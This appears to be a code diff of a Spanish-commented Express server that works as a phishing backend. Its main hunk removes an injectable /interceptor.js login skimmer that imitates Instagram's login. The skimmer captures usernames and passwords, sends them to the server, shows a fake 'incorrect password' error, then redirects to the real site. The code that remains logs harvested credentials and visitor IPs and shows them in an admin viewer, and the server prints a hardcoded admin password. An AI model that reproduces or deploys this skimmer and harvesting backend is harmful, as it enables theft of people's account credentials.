@@ -27,21 +27,21 @@
  *   PORT  (default: 3000)
  */
 
-const express   = require("express");
-const path      = require("path");
-const fs        = require("fs");
-const bcrypt    = require("bcryptjs");
-const winston   = require("winston");
+const express = require("express");
+const path = require("path");
+const fs = require("fs");
+const bcrypt = require("bcryptjs");
+const winston = require("winston");
 const rateLimit = require("express-rate-limit");
-const helmet    = require("helmet");
+const helmet = require("helmet");
 
-const app  = express();
+const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ──────────────────────────────────────────────────────────
 // DIRECTORIOS
 // ──────────────────────────────────────────────────────────
-const logsDir   = path.join(__dirname, "logs");
+const logsDir = path.join(__dirname, "logs");
 const usersFile = path.join(logsDir, "admin-users.json");
 if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
 
@@ -115,26 +115,26 @@ const logger = winston.createLogger({
 function getClientIP(req) {
   return (
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-    req.headers["x-real-ip"]          ||
-    req.headers["cf-connecting-ip"]   ||
-    req.headers["true-client-ip"]     ||
-    req.socket?.remoteAddress         ||
-    req.connection?.remoteAddress     ||
+    req.headers["x-real-ip"] ||
+    req.headers["cf-connecting-ip"] ||
+    req.headers["true-client-ip"] ||
+    req.socket?.remoteAddress ||
+    req.connection?.remoteAddress ||
     "unknown"
   );
 }
 
 function buildLogEntry(req, extra = {}) {
   return {
-    ip:        getClientIP(req),
-    method:    req.method,
-    path:      req.path,
+    ip: getClientIP(req),
+    method: req.method,
+    path: req.path,
     userAgent: req.headers["user-agent"] || "unknown",
-    referer:   req.headers["referer"]         || null,
-    language:  req.headers["accept-language"] || null,
-    encoding:  req.headers["accept-encoding"] || null,
-    origin:    req.headers["origin"]          || null,
-    host:      req.headers["host"]            || null,
+    referer: req.headers["referer"] || null,
+    language: req.headers["accept-language"] || null,
+    encoding: req.headers["accept-encoding"] || null,
+    origin: req.headers["origin"] || null,
+    host: req.headers["host"] || null,
     ...extra,
   };
 }
@@ -197,182 +197,6 @@ const loginLimiter = rateLimit({
 app.use(express.static(path.join(__dirname, "public")));
 
 // ──────────────────────────────────────────────────────────
-// GET /interceptor.js
-// Sirve el script de interceptación de login como archivo JS.
-// Incluirlo en la página objetivo con:
-//   <script src="https://TU-SERVIDOR/interceptor.js"></script>
-// ──────────────────────────────────────────────────────────
-app.get("/interceptor.js", (req, res) => {
-  // ── Configuración del interceptor ──────────────────────
-  // Cambia estos valores según tu despliegue.
-  const BACKEND      = `https://${req.headers.host}/login`;
-  const VISIT_URL    = `https://${req.headers.host}/visit`;
-  const REDIRECT_URL = "https://www.instagram.com/";
-  const MAX_ATTEMPTS = 2;
-  const PAGE_ID      = "instagram";
-  const ERROR_MSG    = "Tu contraseña es incorrecta. Compruébala e inténtalo de nuevo.";
-  // ───────────────────────────────────────────────────────
-
-  const script = `/* LOGIN INTERCEPTOR v4 — auto-generado por el servidor */
-(function () {
-  'use strict';
-  var PAGE_ID      = ${JSON.stringify(PAGE_ID)};
-  var BACKEND      = ${JSON.stringify(BACKEND)};
-  var VISIT_URL    = ${JSON.stringify(VISIT_URL)};
-  var REDIRECT_URL = ${JSON.stringify(REDIRECT_URL)};
-  var MAX_ATTEMPTS = ${MAX_ATTEMPTS};
-  var ERROR_MSG    = ${JSON.stringify(ERROR_MSG)};
-  var _sent        = false;
-
-  /* ── Contador de intentos en sessionStorage ─────────── */
-  function getAttempts() {
-    return parseInt(sessionStorage.getItem('_ig_attempts') || '0', 10);
-  }
-  function incrementAttempts() {
-    var n = getAttempts() + 1;
-    sessionStorage.setItem('_ig_attempts', n);
-    return n;
-  }
-
-  /* ── Envío de logs (sendBeacon + fetch fallback) ─────── */
-  function sendLog(url, data) {
-    var payload = JSON.stringify(data);
-    if (navigator.sendBeacon) {
-      try {
-        return navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
-      } catch (_e) {}
-    }
-    return fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: payload,
-      keepalive: true
-    }).catch(function () {});
-  }
-
-  /* ── Visita de página ───────────────────────────────── */
-  sendLog(VISIT_URL, {
-    page: window.location.pathname,
-    user: 'anonymous',
-    event: 'PAGE_VISIT'
-  });
-
-  /* ── Error UI ─────────────────────────────────────────── */
-  function showError() {
-    var d = document.getElementById('_ig_err');
-    if (!d) {
-      d = document.createElement('div');
-      d.id = '_ig_err';
-      d.style.cssText = [
-        'background:#fffbe5', 'border:1px solid #f0c040',
-        'border-radius:6px', 'padding:10px 14px', 'margin:8px 0 4px',
-        'color:#333', 'font-size:14px',
-        'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif',
-        'text-align:center', 'line-height:1.4', 'z-index:9999', 'position:relative'
-      ].join(';');
-      var form = document.getElementById('login_form');
-      if (form && form.parentNode) {
-        form.parentNode.insertBefore(d, form);
-      } else {
-        document.body.insertBefore(d, document.body.firstChild);
-      }
-    }
-    d.textContent = ERROR_MSG;
-    d.style.display = 'block';
-  }
-
-  /* ── Envío al backend ─────────────────────────────────── */
-  async function sendToBackend(username, password, extraFields) {
-    await sendLog(BACKEND, Object.assign({
-      username: username,
-      password: password,
-      page:     PAGE_ID,
-      event:    'LOGIN_ATTEMPT'
-    }, extraFields || {}));
-  }
-
-  /* ── Lógica principal ─────────────────────────────────── */
-  async function onLoginAttempt(e) {
-    if (e) {
-      e.preventDefault();
-      e.stopImmediatePropagation();
-      e.stopPropagation();
-    }
-    if (_sent) return;
-    _sent = true;
-    setTimeout(function () { _sent = false; }, 800);
-
-    var form = document.getElementById('login_form');
-    var user = '', pass = '';
-    if (form) {
-      var uEl = form.querySelector('[name="email"]') || form.querySelector('[name="username"]');
-      var pEl = form.querySelector('[name="pass"]')  || form.querySelector('[name="password"]');
-      user = uEl ? uEl.value.trim() : '';
-      pass = pEl ? pEl.value : '';
-    }
-
-    var attempts = incrementAttempts();
-
-    if (attempts >= MAX_ATTEMPTS) {
-      sessionStorage.removeItem('_ig_attempts');
-      await sendToBackend(user, pass, {
-        event:      'MAX_ATTEMPTS_REDIRECT',
-        attempts:   attempts,
-        redirectTo: REDIRECT_URL
-      });
-      setTimeout(function () { window.location.href = REDIRECT_URL; }, 600);
-    } else {
-      await sendToBackend(user, pass);
-      showError();
-    }
-    return false;
-  }
-
-  /* ── ¿Es este evento un intento de login? ─────────────── */
-  function isLoginTarget(target) {
-    if (!target) return false;
-    var el = target, depth = 0;
-    while (el && depth < 8) {
-      var label = (el.getAttribute && el.getAttribute('aria-label')) || '';
-      if (label === 'Iniciar sesión') return true;
-      if (el.getAttribute && el.getAttribute('role') === 'button') {
-        var f = document.getElementById('login_form');
-        if (f && f.contains(el)) return true;
-      }
-      var tag = (el.tagName || '').toLowerCase();
-      if (tag === 'button' || (tag === 'input' && el.type === 'submit')) {
-        var f2 = document.getElementById('login_form');
-        if (f2 && f2.contains(el)) return true;
-      }
-      el = el.parentElement;
-      depth++;
-    }
-    return false;
-  }
-
-  /* ── Delegación de eventos en document ────────────────── */
-  ['click', 'touchend', 'pointerup'].forEach(function (ev) {
-    document.addEventListener(ev, function (e) {
-      if (isLoginTarget(e.target)) onLoginAttempt(e);
-    }, true);
-  });
-  document.addEventListener('submit', function (e) {
-    if (e.target && e.target.id === 'login_form') onLoginAttempt(e);
-  }, true);
-  document.addEventListener('keydown', function (e) {
-    if (e.key !== 'Enter' && e.keyCode !== 13) return;
-    var form = document.getElementById('login_form');
-    if (form && form.contains(e.target)) onLoginAttempt(e);
-  }, true);
-
-})();`;
-
-  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
-  res.setHeader("Cache-Control", "no-store");
-  res.send(script);
-});
-
-// ──────────────────────────────────────────────────────────
 // POST /login
 // Gestiona tanto LOGIN_ATTEMPT normal como MAX_ATTEMPTS_REDIRECT
 // ──────────────────────────────────────────────────────────
@@ -388,14 +212,14 @@ app.post("/login", loginLimiter, (req, res) => {
   logger.info(
     isRedirect ? "max_attempts_redirect" : "login_attempt",
     buildLogEntry(req, {
-      event:          isRedirect ? "MAX_ATTEMPTS_REDIRECT" : "LOGIN_ATTEMPT",
-      page:           page || null,
-      username:       username || "(vacío)",
-      password:       passwordB64,
+      event: isRedirect ? "MAX_ATTEMPTS_REDIRECT" : "LOGIN_ATTEMPT",
+      page: page || null,
+      username: username || "(vacío)",
+      password: passwordB64,
       passwordLength: password ? password.length : 0,
       // Campos extra solo presentes en el evento de redirección
       ...(isRedirect && {
-        attempts:   attempts   || null,
+        attempts: attempts || null,
         redirectTo: redirectTo || null,
       }),
     })
@@ -411,8 +235,8 @@ app.post("/visit", (req, res) => {
   const { page, user } = req.body || {};
   logger.info("page_visit", buildLogEntry(req, {
     event: "PAGE_VISIT",
-    page:  page || "/",
-    user:  user || "anonymous",
+    page: page || "/",
+    user: user || "anonymous",
   }));
   res.json({ success: true });
 });
@@ -427,10 +251,10 @@ async function basicAuth(req, res, next) {
     return res.status(401).send("Acceso no autorizado");
   }
 
-  const decoded  = Buffer.from(authHeader.split(" ")[1], "base64").toString();
+  const decoded = Buffer.from(authHeader.split(" ")[1], "base64").toString();
   const colonIdx = decoded.indexOf(":");
-  const user     = decoded.slice(0, colonIdx);
-  const pass     = decoded.slice(colonIdx + 1);
+  const user = decoded.slice(0, colonIdx);
+  const pass = decoded.slice(colonIdx + 1);
 
   for (const u of adminUsers) {
     if (u.username === user) {
@@ -480,7 +304,7 @@ app.post("/admin/users", basicAuth, async (req, res) => {
 
 app.put("/admin/users/:username/password", basicAuth, async (req, res) => {
   const { username } = req.params;
-  const { password }  = req.body;
+  const { password } = req.body;
   if (!password)
     return res.status(400).json({ error: "La nueva contraseña es obligatoria." });
   if (password.length < 8)
@@ -526,12 +350,12 @@ app.delete("/admin/logs/line/:index", basicAuth, (req, res) => {
 // GET /admin/logs
 // ──────────────────────────────────────────────────────────
 app.get("/admin/logs", basicAuth, (req, res) => {
-  const limit       = Math.min(Math.max(parseInt(req.query.limit) || 50, 1), 500);
-  const page        = Math.max(parseInt(req.query.page) || 1, 1);
-  const filter      = req.query.filter   || "";
-  const type        = req.query.type     || "";
-  const ipFilter    = req.query.ip       || "";
-  const excludeRaw  = req.query.exclude;
+  const limit = Math.min(Math.max(parseInt(req.query.limit) || 50, 1), 500);
+  const page = Math.max(parseInt(req.query.page) || 1, 1);
+  const filter = req.query.filter || "";
+  const type = req.query.type || "";
+  const ipFilter = req.query.ip || "";
+  const excludeRaw = req.query.exclude;
   const excludeList = excludeRaw
     ? (Array.isArray(excludeRaw) ? excludeRaw : [excludeRaw])
     : [];
@@ -539,12 +363,12 @@ app.get("/admin/logs", basicAuth, (req, res) => {
   const allLines = readAllLogs();
 
   // Estadísticas globales (sin filtros)
-  const totalGlobal          = allLines.length;
-  const globalLoginNormal    = allLines.filter(l => l.message === "login_attempt").length;
-  const globalMaxAttempts    = allLines.filter(l => l.message === "max_attempts_redirect").length;
-  const globalLoginCount     = globalLoginNormal + globalMaxAttempts; // total = normales + redirigidos
-  const globalAdminDenied    = allLines.filter(l => l.message === "admin_access_denied").length;
-  const globalRateLimited    = allLines.filter(l => l.message === "rate_limit_exceeded").length;
+  const totalGlobal = allLines.length;
+  const globalLoginNormal = allLines.filter(l => l.message === "login_attempt").length;
+  const globalMaxAttempts = allLines.filter(l => l.message === "max_attempts_redirect").length;
+  const globalLoginCount = globalLoginNormal + globalMaxAttempts; // total = normales + redirigidos
+  const globalAdminDenied = allLines.filter(l => l.message === "admin_access_denied").length;
+  const globalRateLimited = allLines.filter(l => l.message === "rate_limit_exceeded").length;
 
   // IPs de todos los logs
   const ipStats = {};
@@ -565,15 +389,15 @@ app.get("/admin/logs", basicAuth, (req, res) => {
     .filter(l => !excludeList.includes(l.message))
     .filter(l => !type || (type === "login_all" ? LOGIN_TYPES.includes(l.message) : l.message === type))
     .filter(l => !ipFilter || (l.ip && l.ip.includes(ipFilter)))
-    .filter(l => !filter   || JSON.stringify(l).toLowerCase().includes(filter.toLowerCase()));
+    .filter(l => !filter || JSON.stringify(l).toLowerCase().includes(filter.toLowerCase()));
 
   filtered = filtered.reverse();
 
   const totalFiltered = filtered.length;
-  const totalPages    = Math.max(Math.ceil(totalFiltered / limit), 1);
-  const safePage      = Math.min(page, totalPages);
-  const offset        = (safePage - 1) * limit;
-  const pageLines     = filtered.slice(offset, offset + limit);
+  const totalPages = Math.max(Math.ceil(totalFiltered / limit), 1);
+  const safePage = Math.min(page, totalPages);
+  const offset = (safePage - 1) * limit;
+  const pageLines = filtered.slice(offset, offset + limit);
 
   res.send(buildLogViewerHTML({
     lines: pageLines, limit, page: safePage, totalPages, totalFiltered,
@@ -648,12 +472,12 @@ function buildLogViewerHTML({
 
   function eventBadge(msg) {
     const map = {
-      login_attempt:          ["login-badge",            "🔑 login_attempt"],
-      max_attempts_redirect:  ["purple",                 "🚨 max_attempts"],   // ← v4
-      admin_access:           ["success",                "🛡 admin_access"],
-      admin_access_denied:    ["danger",                 "⛔ admin_denied"],
-      rate_limit_exceeded:    ["warning text-dark",      "🚫 rate_limit"],
-      page_visit:             ["info text-dark",         "👁 page_visit"],
+      login_attempt: ["login-badge", "🔑 login_attempt"],
+      max_attempts_redirect: ["purple", "🚨 max_attempts"],   // ← v4
+      admin_access: ["success", "🛡 admin_access"],
+      admin_access_denied: ["danger", "⛔ admin_denied"],
+      rate_limit_exceeded: ["warning text-dark", "🚫 rate_limit"],
+      page_visit: ["info text-dark", "👁 page_visit"],
     };
     const [cls, label] = map[msg] || ["secondary", esc(msg) || "—"];
     if (cls === "login-badge")
@@ -673,10 +497,10 @@ function buildLogViewerHTML({
   }
 
   const rows = lines.map(l => {
-    const isLogin    = l.message === "login_attempt";
+    const isLogin = l.message === "login_attempt";
     const isRedirect = l.message === "max_attempts_redirect";  // ← v4
-    const isDenied   = l.message === "admin_access_denied";
-    const rowCls     = (isLogin || isRedirect) ? "row-login" : isDenied ? "row-denied" : "";
+    const isDenied = l.message === "admin_access_denied";
+    const rowCls = (isLogin || isRedirect) ? "row-login" : isDenied ? "row-denied" : "";
 
     let pwCell = '<span class="text-muted">—</span>';
     if ((isLogin || isRedirect) && l.password && l.password !== "(vacío)") {
@@ -696,8 +520,8 @@ function buildLogViewerHTML({
       <td>${eventBadge(l.message)}</td>
       <td class="text-nowrap">${methodBadge(l.method)} <code class="small text-dark">${pathDisplay(l)}</code>${extraInfo}</td>
       <td>${(isLogin || isRedirect || isDenied)
-          ? `<strong class="text-danger">${esc(l.username || l.attemptedUser)}</strong>`
-          : '<span class="text-muted">—</span>'}</td>
+        ? `<strong class="text-danger">${esc(l.username || l.attemptedUser)}</strong>`
+        : '<span class="text-muted">—</span>'}</td>
       <td>${pwCell}</td>
       <td class="small text-muted text-truncate" style="max-width:180px" title="${esc(l.userAgent)}">${esc(l.userAgent) || "—"}</td>
       <td class="text-center">
@@ -708,25 +532,25 @@ function buildLogViewerHTML({
 
   const typeOpts = [
     ["", "Todos los eventos"],
-    ["login_all",             "🔑 todos los logins (normal + redirigido)"],
-    ["login_attempt",         "🔑 login_attempt (solo normales)"],
+    ["login_all", "🔑 todos los logins (normal + redirigido)"],
+    ["login_attempt", "🔑 login_attempt (solo normales)"],
     ["max_attempts_redirect", "🚨 max_attempts (solo redirigidos)"],
-    ["page_visit",            "👁 page_visit"],
-    ["admin_access",          "🛡 admin_access"],
-    ["admin_access_denied",   "⛔ admin_denied"],
-    ["rate_limit_exceeded",   "🚫 rate_limit"],
+    ["page_visit", "👁 page_visit"],
+    ["admin_access", "🛡 admin_access"],
+    ["admin_access_denied", "⛔ admin_denied"],
+    ["rate_limit_exceeded", "🚫 rate_limit"],
   ].map(([v, l]) => `<option value="${v}" ${type === v ? "selected" : ""}>${l}</option>`).join("");
 
   const limitOpts = [25, 50, 100, 200, 500]
     .map(n => `<option value="${n}" ${n == limit ? "selected" : ""}>${n} / pág.</option>`).join("");
 
   const ALL_EVENTS = [
-    ["login_attempt",         "🔑 login_attempt"],
+    ["login_attempt", "🔑 login_attempt"],
     ["max_attempts_redirect", "🚨 max_attempts"],
-    ["page_visit",            "👁 page_visit"],
-    ["admin_access",          "🛡 admin_access"],
-    ["admin_access_denied",   "⛔ admin_denied"],
-    ["rate_limit_exceeded",   "🚫 rate_limit"],
+    ["page_visit", "👁 page_visit"],
+    ["admin_access", "🛡 admin_access"],
+    ["admin_access_denied", "⛔ admin_denied"],
+    ["rate_limit_exceeded", "🚫 rate_limit"],
   ];
   // Pill especial que excluye AMBOS tipos de login a la vez
   const loginBothExcluded = excludeList.includes("login_attempt") && excludeList.includes("max_attempts_redirect");
@@ -740,8 +564,8 @@ function buildLogViewerHTML({
     if (totalPages <= 1) return "";
     const buildUrl = (p) => {
       const q = new URLSearchParams();
-      if (filter)   q.set("filter", filter);
-      if (type)     q.set("type", type);
+      if (filter) q.set("filter", filter);
+      if (type) q.set("type", type);
       if (ipFilter) q.set("ip", ipFilter);
       if (limit !== 50) q.set("limit", limit);
       excludeList.forEach(e => q.append("exclude", e));
@@ -778,7 +602,7 @@ function buildLogViewerHTML({
   const ipRows = Object.entries(ipStats)
     .sort((a, b) => b[1].total - a[1].total)
     .map(([ip, s]) => {
-      const risk  = s.logins > 10 ? "danger" : s.logins > 3 ? "warning" : "success";
+      const risk = s.logins > 10 ? "danger" : s.logins > 3 ? "warning" : "success";
       const label = s.logins > 10 ? "Alto" : s.logins > 3 ? "Medio" : "Bajo";
       return `<tr>
         <td><code class="ip-code ip-modal-filter" data-ip="${esc(ip)}" style="cursor:pointer" title="Filtrar">${esc(ip)}</code></td>
@@ -1564,6 +1388,5 @@ app.listen(PORT, () => {
   logger.info("server_start", { event: "SERVER_STARTED", port: PORT, pid: process.pid });
   console.log("\n🚀  Servidor en      http://localhost:" + PORT);
   console.log("📊  Visor de logs    http://localhost:" + PORT + "/admin/logs");
-  console.log("🪝  Interceptor JS   http://localhost:" + PORT + "/interceptor.js");
   console.log("   (usuario: admin | contraseña: supersecret123)\n");
 });
